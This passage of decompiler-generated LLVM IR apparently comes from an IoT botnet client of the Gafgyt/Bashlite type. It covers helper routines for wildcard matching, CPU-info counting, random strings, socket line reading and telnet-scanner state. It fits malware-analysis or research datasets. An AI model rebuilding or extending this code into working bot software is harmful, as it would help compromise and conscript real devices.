  %v1_8048e02 = icmp eq i32 %v5_8048dfd, 0
  br i1 %v1_8048e02, label %dec_label_pc_8048e30, label %dec_label_pc_8048e06

dec_label_pc_8048e06:                             ; preds = %dec_label_pc_8048def
  %v2_8048e09 = load i8, i8* %tmp12, align 1
  %v4_8048e0c = icmp eq i8 %v2_8048e09, 0
  br i1 %v4_8048e0c, label %dec_label_pc_8048e37, label %dec_label_pc_8048e10

dec_label_pc_8048e10:                             ; preds = %dec_label_pc_8048e06
  %v1_8048e13 = add i32 %arg2, 1
  %v5_8048e1e = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048e13)
  %v1_8048e23 = icmp eq i32 %v5_8048e1e, 0
  br i1 %v1_8048e23, label %dec_label_pc_8048e30, label %dec_label_pc_8048e37

dec_label_pc_8048e30:                             ; preds = %dec_label_pc_8048e10, %dec_label_pc_8048def
  br label %dec_label_pc_8048e37

dec_label_pc_8048e37:                             ; preds = %dec_label_pc_8048e06, %dec_label_pc_8048e10, %dec_label_pc_8048e30
  %storemerge5 = phi i32 [ 0, %dec_label_pc_8048e30 ], [ 1, %dec_label_pc_8048e10 ], [ 1, %dec_label_pc_8048e06 ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048e42:                             ; preds = %dec_label_pc_8048dcd
  %v2_8048e45 = load i8, i8* %tmp12, align 1
  %v4_8048e48 = icmp eq i8 %v2_8048e45, 0
  br i1 %v4_8048e48, label %dec_label_pc_8048e74, label %dec_label_pc_8048e4c

dec_label_pc_8048e4c:                             ; preds = %dec_label_pc_8048e42
  %v1_8048e4f = add i32 %arg2, 1
  %v1_8048e53 = add i32 %v4_8048dbb, 1
  %v4_8048e58 = inttoptr i32 %v1_8048e53 to i8*
  %v5_8048e5b = call i32 @wildString(i8* %v4_8048e58, i32 %v1_8048e4f)
  %v1_8048e60 = icmp ne i32 %v5_8048e5b, 0
  %. = zext i1 %v1_8048e60 to i32
  br label %dec_label_pc_8048e74

dec_label_pc_8048e74:                             ; preds = %dec_label_pc_8048e4c, %dec_label_pc_8048e42
  %storemerge4 = phi i32 [ 1, %dec_label_pc_8048e42 ], [ %., %dec_label_pc_8048e4c ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048e7c:                             ; preds = %dec_label_pc_8048dd3
  %v2_8048e7f = load i8, i8* %arg1, align 1
  %v3_8048e7f = zext i8 %v2_8048e7f to i32
  %v2_8048e88 = call i32 @__GI_toupper(i32 %v3_8048e7f)
  store i32 %v2_8048e88, i32* @ebx, align 4
  %v2_8048e92 = load i8, i8* %tmp12, align 1
  %v3_8048e92 = zext i8 %v2_8048e92 to i32
  %v2_8048e9b = call i32 @__GI_toupper(i32 %v3_8048e92)
  %v0_8048ea0 = load i32, i32* @ebx, align 4
  %v12_8048ea0 = icmp eq i32 %v0_8048ea0, %v2_8048e9b
  %v1_8048ea2 = icmp eq i1 %v12_8048ea0, false
  br i1 %v1_8048ea2, label %dec_label_pc_8048ecc, label %dec_label_pc_8048ea4

dec_label_pc_8048ea4:                             ; preds = %dec_label_pc_8048e7c
  %v1_8048ea7 = add i32 %arg2, 1
  %v1_8048eab = add i32 %v4_8048dbb, 1
  %v4_8048eb0 = inttoptr i32 %v1_8048eab to i8*
  %v5_8048eb3 = call i32 @wildString(i8* %v4_8048eb0, i32 %v1_8048ea7)
  %v1_8048eb8 = icmp ne i32 %v5_8048eb3, 0
  %.6 = zext i1 %v1_8048eb8 to i32
  br label %dec_label_pc_8048ecc

dec_label_pc_8048ecc:                             ; preds = %dec_label_pc_8048ea4, %dec_label_pc_8048e7c
  %storemerge = phi i32 [ 1, %dec_label_pc_8048e7c ], [ %.6, %dec_label_pc_8048ea4 ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048ed2:                             ; preds = %dec_label_pc_8048e74, %dec_label_pc_8048e37, %dec_label_pc_8048dde, %dec_label_pc_8048ecc
  %stack_var_-24.0 = phi i32 [ %storemerge5, %dec_label_pc_8048e37 ], [ %storemerge4, %dec_label_pc_8048e74 ], [ %v3_8048de1, %dec_label_pc_8048dde ], [ %storemerge, %dec_label_pc_8048ecc ]
  %v2_8048ed8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048ed8, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048dbe, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048ed2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048e37, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_8048edb = load i32, i32* @ebp, align 4
  %v1_8048ee7 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048ee7, i32* %arg2, align 4
  %v10_8048ef8 = icmp eq i32 %v1_8048ee7, -1
  %. = zext i1 %v10_8048ef8 to i32
  store i32 %v0_8048edb, i32* @ebp, align 4
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048f12 = load i32, i32* @ebp, align 4
  store i32 %v0_8048f12, i32* %stack_var_-4, align 4
  %v4_8048f354 = ptrtoint i8* %arg1 to i32
  %v2_8048f385 = load i8, i8* %arg1, align 1
  %v4_8048f3b7 = icmp eq i8 %v2_8048f385, 0
  %v1_8048f3d9 = icmp eq i1 %v4_8048f3b7, false
  br i1 %v1_8048f3d9, label %dec_label_pc_8048f1a, label %dec_label_pc_8048f3f

dec_label_pc_8048f1a:                             ; preds = %entry, %dec_label_pc_8048f1a
  %v4_8048f3511 = phi i32 [ %v5_8048f32, %dec_label_pc_8048f1a ], [ %v4_8048f354, %entry ]
  %stack_var_4.010 = phi i8* [ %v22_8048f32, %dec_label_pc_8048f1a ], [ %arg1, %entry ]
  %v2_8048f1d = load i8, i8* %stack_var_4.010, align 1
  %v3_8048f1d = zext i8 %v2_8048f1d to i32
  %v1_8048f26 = call i32 @__GI_toupper(i32 %v3_8048f1d)
  %v1_8048f30 = trunc i32 %v1_8048f26 to i8
  store i8 %v1_8048f30, i8* %stack_var_4.010, align 1
  %v5_8048f32 = add i32 %v4_8048f3511, 1
  %v22_8048f32 = inttoptr i32 %v5_8048f32 to i8*
  %v2_8048f38 = load i8, i8* %v22_8048f32, align 1
  %v4_8048f3b = icmp eq i8 %v2_8048f38, 0
  %v1_8048f3d = icmp eq i1 %v4_8048f3b, false
  br i1 %v1_8048f3d, label %dec_label_pc_8048f1a, label %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge

dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge: ; preds = %dec_label_pc_8048f1a
  %v2_8048f3f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048f3f

dec_label_pc_8048f3f:                             ; preds = %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge, %entry
  %v2_8048f3f = phi i32 [ %v2_8048f3f.pre, %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge ], [ %v0_8048f12, %entry ]
  %v3_8048f38.lcssa.in = phi i8 [ %v2_8048f38, %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge ], [ %v2_8048f385, %entry ]
  %v3_8048f38.lcssa = zext i8 %v3_8048f38.lcssa.in to i32
  store i32 %v2_8048f3f, i32* @ebp, align 4
  ret i32 %v3_8048f38.lcssa

; uselistorder directives
  uselistorder i8* %v22_8048f32, { 1, 0 }
  uselistorder i32 %v5_8048f32, { 1, 0 }
  uselistorder i8* %stack_var_4.010, { 1, 0 }
  uselistorder label %dec_label_pc_8048f1a, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %v5_8048f5a = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8057940.18, i32 0, i32 0), i32 0)
  %v2_80490ba = ptrtoint i32* %stack_var_-4112 to i32
  %tmp22 = bitcast i32* %stack_var_-4112 to i8*
  %v5_80490d224 = call i32 @fdgets(i32 %v2_80490ba, i32 4096, i32 %v5_8048f5a)
  %v1_80490d725 = icmp eq i32 %v5_80490d224, 0
  %v1_80490d927 = icmp eq i1 %v1_80490d725, false
  br i1 %v1_80490d927, label %dec_label_pc_8048f67, label %dec_label_pc_80490df

dec_label_pc_8048f67:                             ; preds = %entry, %dec_label_pc_8049099
  %v3_8048f70 = call i32 @uppercase(i8* %tmp22)
  %v5_8048f86 = call i32 @strstr(i32 %v2_80490ba, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805794e.19, i32 0, i32 0))
  %v12_8048f93 = icmp eq i32 %v5_8048f86, %v2_80490ba
  %v1_8048f95 = icmp eq i1 %v12_8048f93, false
  br i1 %v1_8048f95, label %dec_label_pc_8049099, label %dec_label_pc_8048f9b

dec_label_pc_8048f9b:                             ; preds = %dec_label_pc_8048f67
  %tmp23 = bitcast i32* %stack_var_-4104 to i8*
  br label %dec_label_pc_8048fac

dec_label_pc_8048fa9:                             ; preds = %dec_label_pc_8048fc0, %dec_label_pc_8048fb6, %dec_label_pc_8048fac
  %v5_8048fa9 = add i32 %v4_8048fac, 1
  %v22_8048fa9 = inttoptr i32 %v5_8048fa9 to i8*
  br label %dec_label_pc_8048fac

dec_label_pc_8048fac:                             ; preds = %dec_label_pc_8048f9b, %dec_label_pc_8048fa9
  %storemerge4 = phi i8* [ %v22_8048fa9, %dec_label_pc_8048fa9 ], [ %tmp23, %dec_label_pc_8048f9b ]
  %v4_8048fac = ptrtoint i8* %storemerge4 to i32
  %v2_8048faf = load i8, i8* %storemerge4, align 1
  %v7_8048fb2 = icmp eq i8 %v2_8048faf, 32
  br i1 %v7_8048fb2, label %dec_label_pc_8048fa9, label %dec_label_pc_8048fb6

dec_label_pc_8048fb6:                             ; preds = %dec_label_pc_8048fac
  %v2_8048fb9 = load i8, i8* %storemerge4, align 1
  %v10_8048fbc = icmp eq i8 %v2_8048fb9, 9
  br i1 %v10_8048fbc, label %dec_label_pc_8048fa9, label %dec_label_pc_8048fc0

dec_label_pc_8048fc0:                             ; preds = %dec_label_pc_8048fb6
  %v2_8048fc3 = load i8, i8* %storemerge4, align 1
  %v10_8048fc6 = icmp eq i8 %v2_8048fc3, 58
  br i1 %v10_8048fc6, label %dec_label_pc_8048fa9, label %dec_label_pc_8048ff1.preheader

dec_label_pc_8048ff1.preheader:                   ; preds = %dec_label_pc_8048fc0
  br label %dec_label_pc_8048ff1

dec_label_pc_8048fcc:                             ; preds = %dec_label_pc_804901a, %dec_label_pc_8048ff1
  %v3_8048fe3 = call i32 @_strlen(i8* %storemerge4)
  %v6_8048fea = add i32 %v4_8048fac, %v3_8048fe3
  %v1_8048fed = add i32 %v6_8048fea, -1
  %v1_8048fee = inttoptr i32 %v1_8048fed to i8*
  store i8 0, i8* %v1_8048fee, align 1
  br label %dec_label_pc_8048ff1

dec_label_pc_8048ff1:                             ; preds = %dec_label_pc_8048ff1.preheader, %dec_label_pc_8048fcc
  %v3_8049008 = call i32 @_strlen(i8* %storemerge4)
  %v6_804900f = add i32 %v4_8048fac, %v3_8049008
  %v1_8049012 = add i32 %v6_804900f, -1
  %v1_8049013 = inttoptr i32 %v1_8049012 to i8*
  %v2_8049013 = load i8, i8* %v1_8049013, align 1
  %v10_8049016 = icmp eq i8 %v2_8049013, 13
  br i1 %v10_8049016, label %dec_label_pc_8048fcc, label %dec_label_pc_804901a

dec_label_pc_804901a:                             ; preds = %dec_label_pc_8048ff1
  store i1 false, i1* @df, align 1
  store i32 %v4_8048fac, i32* @edi, align 4
  %v3_8049031 = call i32 @_strlen(i8* %storemerge4)
  %v6_8049038 = add i32 %v4_8048fac, %v3_8049031
  %v1_804903b = add i32 %v6_8049038, -1
  %v1_804903c = inttoptr i32 %v1_804903b to i8*
  %v2_804903c = load i8, i8* %v1_804903c, align 1
  %v10_804903f = icmp eq i8 %v2_804903c, 10
  br i1 %v10_804903f, label %dec_label_pc_8048fcc, label %dec_label_pc_8049043

dec_label_pc_8049043:                             ; preds = %dec_label_pc_804901a
  %v5_8049051 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v1_8049056 = icmp eq i32 %v5_8049051, 0
  br i1 %v1_8049056, label %dec_label_pc_8049070, label %dec_label_pc_804905a

dec_label_pc_804905a:                             ; preds = %dec_label_pc_8049043
  %v5_8049068 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v6_8049068 = inttoptr i32 %v5_8049068 to i8*
  store i8 0, i8* %v6_8049068, align 1
  br label %dec_label_pc_8049070

dec_label_pc_8049070:                             ; preds = %dec_label_pc_8049043, %dec_label_pc_804905a
  store i32 %v4_8048fac, i32* @eax, align 4
  %v4_804907a = inttoptr i32 %arg1 to i8*
  %v5_804907d = call i32 @strcpy(i8* %v4_804907a, i32 %v4_8048fac)
  %v2_8049088 = call i32 @__libc_close(i32 %v5_8048f5a)
  br label %dec_label_pc_80490f4

dec_label_pc_8049099:                             ; preds = %dec_label_pc_8048f67
  %v6_80490b5 = call i32 @__GI_memset(i8* %tmp22, i32 0, i32 4096)
  %v5_80490d2 = call i32 @fdgets(i32 %v2_80490ba, i32 4096, i32 %v5_8048f5a)
  %v1_80490d7 = icmp eq i32 %v5_80490d2, 0
  %v1_80490d9 = icmp eq i1 %v1_80490d7, false
  br i1 %v1_80490d9, label %dec_label_pc_8048f67, label %dec_label_pc_80490df

dec_label_pc_80490df:                             ; preds = %dec_label_pc_8049099, %entry
  %v2_80490e5 = call i32 @__libc_close(i32 %v5_8048f5a)
  br label %dec_label_pc_80490f4

dec_label_pc_80490f4:                             ; preds = %dec_label_pc_8049070, %dec_label_pc_80490df
  %storemerge = phi i32 [ 1, %dec_label_pc_80490df ], [ 0, %dec_label_pc_8049070 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8048fac, { 4, 3, 1, 5, 2, 0, 6 }
  uselistorder i8* %storemerge4, { 0, 1, 2, 4, 3, 5, 6, 8, 7 }
  uselistorder i32 %v2_80490ba, { 3, 0, 2, 1 }
  uselistorder i32 %v5_8048f5a, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_80490f4, { 1, 0 }
  uselistorder label %dec_label_pc_8049070, { 1, 0 }
  uselistorder label %dec_label_pc_8048ff1, { 1, 0 }
  uselistorder label %dec_label_pc_8048fac, { 1, 0 }
  uselistorder label %dec_label_pc_8048f67, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4108 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049103 = load i32, i32* @ebp, align 4
  store i32 %v0_8049103, i32* %stack_var_-4, align 4
  %v4_8049103 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8049103, i32* @ebp, align 4
  %v5_8049122 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8057940.18, i32 0, i32 0), i32 0)
  %v2_8049180 = ptrtoint i32* %stack_var_-4108 to i32
  %tmp10 = bitcast i32* %stack_var_-4108 to i8*
  %v5_804919811 = call i32 @fdgets(i32 %v2_8049180, i32 4096, i32 %v5_8049122)
  %v1_804919d12 = icmp eq i32 %v5_804919811, 0
  %v1_804919f14 = icmp eq i1 %v1_804919d12, false
  br i1 %v1_804919f14, label %dec_label_pc_804912c, label %dec_label_pc_80491a1

dec_label_pc_804912c:                             ; preds = %entry, %dec_label_pc_804915f
  %stack_var_-12.115 = phi i32 [ %stack_var_-12.0, %dec_label_pc_804915f ], [ 0, %entry ]
  %v3_8049135 = call i32 @uppercase(i8* %tmp10)
  %v5_804914b = call i32 @strstr(i32 %v2_8049180, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805794e.19, i32 0, i32 0))
  %v12_8049158 = icmp eq i32 %v5_804914b, %v2_8049180
  %v1_804915a = icmp eq i1 %v12_8049158, false
  br i1 %v1_804915a, label %dec_label_pc_804915f, label %dec_label_pc_804915c

dec_label_pc_804915c:                             ; preds = %dec_label_pc_804912c
  %v4_804915c = add i32 %stack_var_-12.115, 1
  br label %dec_label_pc_804915f

dec_label_pc_804915f:                             ; preds = %dec_label_pc_804912c, %dec_label_pc_804915c
  %stack_var_-12.0 = phi i32 [ %stack_var_-12.115, %dec_label_pc_804912c ], [ %v4_804915c, %dec_label_pc_804915c ]
  %v6_804917b = call i32 @__GI_memset(i8* %tmp10, i32 0, i32 4096)
  %v5_8049198 = call i32 @fdgets(i32 %v2_8049180, i32 4096, i32 %v5_8049122)
  %v1_804919d = icmp eq i32 %v5_8049198, 0
  %v1_804919f = icmp eq i1 %v1_804919d, false
  br i1 %v1_804919f, label %dec_label_pc_804912c, label %dec_label_pc_80491a1

dec_label_pc_80491a1:                             ; preds = %dec_label_pc_804915f, %entry
  %stack_var_-12.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-12.0, %dec_label_pc_804915f ]
  %v2_80491a7 = call i32 @__libc_close(i32 %v5_8049122)
  ret i32 %stack_var_-12.1.lcssa

; uselistorder directives
  uselistorder i32 %v2_8049180, { 3, 0, 2, 1 }
  uselistorder i32 %v5_8049122, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_804915f, { 1, 0 }
  uselistorder label %dec_label_pc_804912c, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80491b1 = load i32, i32* @ebp, align 4
  store i32 %v0_80491b1, i32* %stack_var_-4, align 4
  %v0_80491b4 = load i32, i32* @ebx, align 4
  store i32 %v0_80491b4, i32* %stack_var_-8, align 4
  %v5_80491cd = ptrtoint i8* %arg1 to i32
  %v5_804921325 = icmp sgt i32 %arg2, 0
  br i1 %v5_804921325, label %dec_label_pc_80491c8, label %dec_label_pc_8049215

dec_label_pc_80491c8:                             ; preds = %entry, %dec_label_pc_80491c8
  %storemerge26 = phi i32 [ %v4_804920a, %dec_label_pc_80491c8 ], [ 0, %entry ]
  %v6_80491cd = add i32 %storemerge26, %v5_80491cd
  store i32 %v6_80491cd, i32* @ebx, align 4
  %v1_80491d0 = call i32 @rand_cmwc(i32 %storemerge26)
  %v2_80491e5 = udiv i32 %v1_80491d0, 26
  %tmp = mul i32 %v2_80491e5, -10
  %v2_80491fd = add i32 %v1_80491d0, %tmp
  %v14_80491fd = trunc i32 %v2_80491fd to i8
  %v2_8049206 = add i8 %v14_80491fd, 65
  %v2_8049208 = load i32, i32* @ebx, align 4
  %v3_8049208 = inttoptr i32 %v2_8049208 to i8*
  store i8 %v2_8049206, i8* %v3_8049208, align 1
  %v4_804920a = add nuw nsw i32 %storemerge26, 1
  %exitcond = icmp eq i32 %v4_804920a, %arg2
  br i1 %exitcond, label %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge, label %dec_label_pc_80491c8

dec_label_pc_804920d.dec_label_pc_8049215_crit_edge: ; preds = %dec_label_pc_80491c8
  %v2_8049218.pre = load i32, i32* %stack_var_-8, align 4
  %v2_8049219.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049215

dec_label_pc_8049215:                             ; preds = %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge, %entry
  %v2_8049219 = phi i32 [ %v2_8049219.pre, %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge ], [ %v0_80491b1, %entry ]
  %v2_8049218 = phi i32 [ %v2_8049218.pre, %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge ], [ %v0_80491b4, %entry ]
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge ], [ 0, %entry ]
  store i32 %v2_8049218, i32* @ebx, align 4
  store i32 %v2_8049219, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804920a, { 1, 0 }
  uselistorder i32 %storemerge26, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80491c8, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804921e = load i32, i32* @edi, align 4
  store i32 %v0_804921e, i32* %stack_var_-8, align 4
  %v4_8049228 = ptrtoint i8* %arg2 to i32
  %v1_8049230 = and i32 %v4_8049228, -256
  %v5_8049232 = call i8* @_memset(i8* %arg2, i32 %v1_8049230, i32 %arg3)
  store i32 30, i32* %stack_var_-176, align 4
  %v2_8049252 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049252, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049259 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_8049266 = udiv i32 %arg1, 32
  %v1_804926c = urem i32 %arg1, 32
  %v0_804926f = load i32, i32* @ebp, align 4
  %v2_804926f = mul nuw nsw i32 %v2_8049266, 4
  %v3_804926f = add nsw i32 %v2_804926f, -164
  %v4_804926f = add i32 %v3_804926f, %v0_804926f
  %v5_804926f = inttoptr i32 %v4_804926f to i32*
  %v6_804926f = load i32, i32* %v5_804926f, align 4
  %v9_804926f = shl i32 1, %v1_804926c
  %v12_804926f = or i32 %v6_804926f, %v9_804926f
  store i32 %v12_804926f, i32* %v5_804926f, align 4
  %v1_804927a = add i32 %arg1, 1
  %v2_804927b = ptrtoint i32* %stack_var_-176 to i32
  %v6_80492a4 = call i32 @__libc_select(i32 %v1_804927a, i32 %v2_8049252, i32 0, i32 %v2_8049252, i32 %v2_804927b)
  %tmp33 = icmp slt i32 %v6_80492a4, 1
  %tmp34 = icmp eq i1 %tmp33, false
  br i1 %tmp34, label %dec_label_pc_804935b, label %dec_label_pc_8049351.preheader

dec_label_pc_8049351.preheader:                   ; preds = %entry
  %v7_804935546 = icmp sgt i32 %tmp11, 9
  br i1 %v7_804935546, label %dec_label_pc_804935b, label %dec_label_pc_80492bb

dec_label_pc_80492bb:                             ; preds = %dec_label_pc_8049351.preheader, %dec_label_pc_804934e
  %stack_var_-36.047 = phi i32 [ %v4_804934e, %dec_label_pc_804934e ], [ %tmp11, %dec_label_pc_8049351.preheader ]
  %v0_80492bb = load i32, i32* @global_var_8062580.20, align 128
  %v3_80492cb = call i32 @sockprintf(i32 %v0_80492bb, i32 ptrtoint ([5 x i8]* @global_var_8057957.21 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 %v2_8049252, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80492f5 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v0_804930b = load i32, i32* @ebp, align 4
  %v4_804930b = add i32 %v3_804926f, %v0_804930b
  %v5_804930b = inttoptr i32 %v4_804930b to i32*
  %v6_804930b = load i32, i32* %v5_804930b, align 4
  %v12_804930b = or i32 %v6_804930b, %v9_804926f
  store i32 %v12_804930b, i32* %v5_804930b, align 4
  %v6_8049340 = call i32 @__libc_select(i32 %v1_804927a, i32 %v2_8049252, i32 0, i32 %v2_8049252, i32 %v2_804927b)
  %tmp35 = icmp slt i32 %v6_8049340, 1
  %tmp36 = icmp eq i1 %tmp35, false
  br i1 %tmp36, label %dec_label_pc_804935b, label %dec_label_pc_804934e

dec_label_pc_804934e:                             ; preds = %dec_label_pc_80492bb
  %v4_804934e = add nsw i32 %stack_var_-36.047, 1
  %v7_8049355 = icmp sgt i32 %stack_var_-36.047, 8
  br i1 %v7_8049355, label %dec_label_pc_804935b, label %dec_label_pc_80492bb

dec_label_pc_804935b:                             ; preds = %dec_label_pc_8049351.preheader, %dec_label_pc_80492bb, %dec_label_pc_804934e, %entry
  %v2_804937f = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_80493c5

dec_label_pc_804936a:                             ; preds = %dec_label_pc_80493c5
  %v0_804936a = load i32, i32* @global_var_8062580.20, align 128
  %v5_804938c = call i32 @__libc_recv(i32 %v0_804936a, i32 %v2_804937f, i32 1, i32 0)
  %v9_8049391 = icmp eq i32 %v5_804938c, 1
  br i1 %v9_8049391, label %dec_label_pc_80493a8, label %dec_label_pc_8049396

dec_label_pc_8049396:                             ; preds = %dec_label_pc_804936a
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_80493e2

dec_label_pc_80493a8:                             ; preds = %dec_label_pc_804936a
  %v3_80493a8 = load i8, i8* %stack_var_-177, align 1
  %v4_80493af = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_80493a8, i8* %stack_var_-32.0, align 1
  %v5_80493b4 = add i32 %v4_80493af, 1
  %v22_80493b4 = inttoptr i32 %v5_80493b4 to i8*
  %v3_80493b7 = load i8, i8* %stack_var_-177, align 1
  %v10_80493be = icmp eq i8 %v3_80493b7, 10
  br i1 %v10_80493be, label %dec_label_pc_80493d3, label %dec_label_pc_80493c2

dec_label_pc_80493c2:                             ; preds = %dec_label_pc_80493a8
  %v4_80493c2 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_80493c5

dec_label_pc_80493c5:                             ; preds = %dec_label_pc_804935b, %dec_label_pc_80493c2
  %stack_var_-32.0 = phi i8* [ %arg2, %dec_label_pc_804935b ], [ %v22_80493b4, %dec_label_pc_80493c2 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804935b ], [ %v4_80493c2, %dec_label_pc_80493c2 ]
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_804935b ], [ %v4_80493c5, %dec_label_pc_80493c2 ]
  %v4_80493c5 = add i32 %stack_var_12.0, -1
  %v9_80493c5 = sub i32 0, %stack_var_12.0
  %v10_80493c5 = and i32 %stack_var_12.0, %v9_80493c5
  %v11_80493c5 = icmp slt i32 %v10_80493c5, 0
  %v12_80493c5 = icmp eq i32 %v4_80493c5, 0
  %v13_80493c5 = icmp slt i32 %v4_80493c5, 0
  %v3_80493c9 = icmp eq i1 %v13_80493c5, %v11_80493c5
  %v4_80493c9 = icmp eq i1 %v12_80493c5, false
  %v5_80493c9 = and i1 %v4_80493c9, %v3_80493c9
  %v4_80493cf = icmp eq i1 %v5_80493c9, false
  %v1_80493d1 = icmp eq i1 %v4_80493cf, false
  br i1 %v1_80493d1, label %dec_label_pc_804936a, label %dec_label_pc_80493d3

dec_label_pc_80493d3:                             ; preds = %dec_label_pc_80493a8, %dec_label_pc_80493c5
  %stack_var_-32.1 = phi i8* [ %v22_80493b4, %dec_label_pc_80493a8 ], [ %stack_var_-32.0, %dec_label_pc_80493c5 ]
  store i8 0, i8* %stack_var_-32.1, align 1
  br label %dec_label_pc_80493e2

dec_label_pc_80493e2:                             ; preds = %dec_label_pc_8049396, %dec_label_pc_80493d3
  %storemerge = phi i32 [ -1, %dec_label_pc_8049396 ], [ %stack_var_-28.0, %dec_label_pc_80493d3 ]
  %v2_80493ee = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80493ee, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_80493c5, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 1, 0, 2, 3 }
  uselistorder i8* %v22_80493b4, { 1, 0 }
  uselistorder i32 %v2_8049252, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80493e2, { 1, 0 }
  uselistorder label %dec_label_pc_80493d3, { 1, 0 }
  uselistorder label %dec_label_pc_80493c5, { 1, 0 }
  uselistorder label %dec_label_pc_804935b, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80492bb, { 1, 0 }
}

define i32 @get_telstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v0_80493f1 = load i32, i32* @ebp, align 4
  %v1_80493fa = add i32 %tmp1, 4
  %v2_80493fa = inttoptr i32 %v1_80493fa to i32*
  %v3_80493fa = load i32, i32* %v2_80493fa, align 4
  %v1_8049406 = call i32 @__GI_inet_ntoa(i32 %v3_80493fa)
  store i32 %v0_80493f1, i32* @ebp, align 4
  ret i32 %v1_8049406
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8049410 = load i32, i32* @edi, align 4
  store i32 %v0_8049410, i32* %stack_var_-8, align 4
  %v1_804941a = inttoptr i32 %tmp8 to i8*
  store i32 %tmp8, i32* @edi, align 4
  %v1_804941f = and i32 %tmp8, -256
  %v5_8049421 = call i8* @_memset(i8* %v1_804941a, i32 %v1_804941f, i32 %tmp9)
  %v4_804943e = call i32 @read_with_timeout(i32 %arg1, i32 %tmp5, i32 %tmp8, i32 %tmp9)
  %v2_8049453 = inttoptr i32 %tmp1 to i32*
  %v3_8049453 = call i32 @contains_string(i32 %tmp8, i32* %v2_8049453)
